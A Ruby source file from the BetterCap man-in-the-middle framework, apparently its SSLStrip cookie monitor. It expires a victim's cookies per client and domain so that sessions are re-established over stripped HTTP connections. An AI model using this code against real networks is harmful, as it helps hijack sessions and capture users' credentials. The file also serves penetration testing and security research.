# encoding: UTF-8
=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end

module BetterCap
module Proxy
module SSLStrip

# Class to handle a cookies for sslstrip.
class CookieMonitor
  # Create an instance of this object.
  def initialize
    @set = []
  end

  # Return true if the +request+ was already cleaned.
  def is_clean?(request)
    if request.post?
      return true
    elsif request['Cookie'].empty?
      return true
    else
      return @set.include?( [request.client, get_domain(request)] )
    end
  end

  # Build cookie expiration headers for the +request+ and add its domain
  # to our list.
  def get_expired_headers!(request)
    domain = get_domain(request)
    @set << [request.client, domain]

    expired = []
    request['Cookie'].split(';').each do |cookie|
      cname = cookie.split("=")[0].strip
      expired << "#{cname}=EXPIRED; path=/; domain=#{domain}; Expires=Mon, 01-Jan-1990 00:00:00 GMT"
      expired << "#{cname}=EXPIRED; path=/; domain=#{request.host}; Expires=Mon, 01-Jan-1990 00:00:00 GMT"
    end

    expired
  end

  # Return the cookie domain given the +request+ object.
  def get_domain(request)
    parts = request.host.split('.')
    ".#{parts[-2]}.#{parts[-1]}"
  end
end

end
end
end
